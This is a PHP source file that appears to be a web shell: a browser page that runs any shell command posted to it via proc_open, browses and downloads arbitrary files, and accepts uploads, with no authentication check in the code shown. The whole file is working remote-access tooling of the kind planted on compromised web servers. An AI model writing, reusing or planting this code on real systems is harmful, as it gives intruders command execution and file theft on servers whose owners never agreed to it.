function print_header() {
    print '<style>pre { background:#ccc; } .error { font-weight:700; color:red; } .success { font-weight:700; color:green; }</style>';
}

function download_file($fullpath) {
    $fh = fopen($fullpath, 'r');
    if ($fh === false) {
        return false;
    }
    fclose($fh);
    header('Content-Disposition: attachment; filename="' . urlencode(basename($fullpath)) . '"');
    header('Content-Type: application/octet-stream');
    header('Content-Length: ' . filesize($fullpath));
    readfile($fullpath);
    exit;
}

function handle_upload($key, $dir) {
    $filename = basename($_FILES[$key]['name']);
    $target = $dir . DIRECTORY_SEPARATOR . $filename;
    if (file_exists($filename)) {
        return false;
    }
    if (!move_uploaded_file($_FILES[$key]['tmp_name'], $filename)) {
        return false;
    }
    return true;
}

function get_cmd_output($command, &$retvar) {
    global $cwd;
    $p = proc_open($command, [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ], $pipes, $cwd);
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    $retvar = proc_close($p);
    return [$stdout, $stderr];
}

$cwd = array_key_exists('cwd', $_POST) ? $_POST['cwd'] : getcwd();
$cwd = realpath($cwd);
chdir($cwd);
$windows = (substr(strtolower(PHP_OS), 0, 3) == 'win');

if (array_key_exists('dl', $_POST) && $_POST['dl']) {
    $file = $cwd . DIRECTORY_SEPARATOR . $_POST['dl'];
    if (download_file($file) == false) {
        print_header();
        print '<p><span class="error">Error opening ' . htmlentities($file) . '.</p>';
    }
} else {
    print_header();
}

if (isset($_FILES) && array_key_exists('upload', $_FILES) && $_FILES['upload']['name']) {
    if (!handle_upload('upload', $cwd)) {
        print '<p class="error">Error uploading file.  Please ensure that the target file does not already exist on the host and that your upload is no larger than ' . ini_get('upload_max_filesize') . '.</p>';
    } else {
        print '<p class="success">File uploaded successfully.</p>';
    }
}


$cmd = array_key_exists('cmd', $_POST) ? $_POST['cmd'] : '';
$status = 0;

if ($cmd) {
    $output = get_cmd_output($cmd, $status);
    $output = [htmlentities($output[0]), htmlentities($output[1])];
}
if ($windows) {
    $dir_out = get_cmd_output("dir \"$cwd\"", $status)[0];
    $dir_out = htmlentities($dir_out);
    $dir_out = preg_replace_callback('/(&lt;DIR&gt;\s+)(.*)\r/', function ($matches) {
        return $matches[1] . '<a onclick="cwdsubmit(this.getAttribute(\'data-dir\'));" href="#" data-dir="' . htmlentities($matches[2]) . '">' . $matches[2] . '</a>';
    }, $dir_out);
    $dir_out = preg_replace_callback('/(\d\d:\d\d [AP]M\s+)([0-9,]+ )(.*)\r/', function ($matches) {
        return $matches[1] . $matches[2] . '<a onclick="downloadsubmit(this.getAttribute(\'data-filename\'));" href="#" data-filename="' . htmlentities($matches[3]) . '">' . $matches[3] . '</a>';
    }, $dir_out);
} else {
    $cwd_interp = str_replace('"', '\\"', $cwd);
    $cwd_interp = str_replace('\\', '\\\\', $cwd_interp);
    $dir_out = get_cmd_output("ls -la $cwd_interp", $status)[0];
    $dir_out_list = explode("\n", $dir_out);
    for ($i = 0; $i < count($dir_out_list); ++$i) {
	$dir_out_list[$i] = preg_replace_callback('/^(d.*\d\s+\d\d:\d\d\s+)(.*)/', function ($matches) {
            return $matches[1] . '<a onclick="cwdsubmit(this.getAttribute(\'data-dir\'));" href="#" data-dir="' . htmlentities($matches[2]) . '">' . $matches[2] . '</a>';
        }, $dir_out_list[$i]);
        $dir_out_list[$i] = preg_replace_callback('/(^[^d].*\d \d\d:\d\d )(.*)/', function ($matches) {
            return $matches[1] . '<a onclick="downloadsubmit(this.getAttribute(\'data-filename\'));" href="#" data-filename="' . htmlentities($matches[2]) . '">' . $matches[2] . '</a>';
        }, $dir_out_list[$i]);
    }
    $dir_out = join($dir_out_list, "\n");
}

print "Directory listing for " . htmlentities($cwd) . ":" . "<pre>" . $dir_out . "</pre>";
?>
<form method="POST" id="main-form" enctype="multipart/form-data">
<input type="hidden" name="cwd" id="cwdoutput" value="<?php echo htmlentities($cwd); ?>" />
<input type="hidden" name="cmd" id="cmdoutput" value="" />
Upload file: <input type="file" name="upload" /><br /><input type="submit" value="Upload here" />
<input type="hidden" class="a" name="a" />
</form>
<form method="POST" id="download-form">
<input type="hidden" name="cwd" value="<?php echo htmlentities($cwd); ?>" />
<input type="hidden" name="dl" id="dloutput" value="" />
<input type="hidden" class="a" name="a" />
</form>
<?php

print '<form onsubmit="cwdsubmit(document.getElementById(\'cwdinput\').value, true); return false;">';
print 'Go to directory: <input id="cwdinput" value="' . htmlentities($cwd) . '" />';
print '</form><form onsubmit="cmdsubmit(); return false;">';
print 'Run shell command: <input id="cmdinput" value="' . htmlentities($cmd) . '">';
print '</form>';
if ($cmd) {
    print "<hr />";
    print "Command: <pre>" . htmlentities($cmd) . "</pre><br />";
    print "Return status: $status<br />";
    if ($output[0]) {
        print "stdout:\n<pre>" . $output[0] . "</pre>";
    }
    if ($output[1]) {
        print "stderr:\n<pre>" . $output[1] . "</pre>";
    }
}

?>
<script type="text/javascript">
    var sep = "<?php echo DIRECTORY_SEPARATOR == '\\' ? '\\\\' : DIRECTORY_SEPARATOR; ?>";
    function cmdsubmit() {
        document.getElementById('cmdoutput').value = document.getElementById('cmdinput').value;
        document.getElementById('main-form').submit();
    }
    function cwdsubmit(cwd, nosep) {
        document.getElementById('cwdoutput').value = (nosep ? '' : document.getElementById('cwdoutput').value + sep) + cwd;
        document.getElementById('main-form').submit();
    }
    function downloadsubmit(file) {
        document.getElementById('dloutput').value = file;
        document.getElementById('download-form').submit();
    }
    (function() {
        var els = document.getElementsByClassName('a');
        for (var i = 0; i < els.length; ++i) {
            els[i].value = sessionStorage.getItem('a');
        }
    })();
</script>
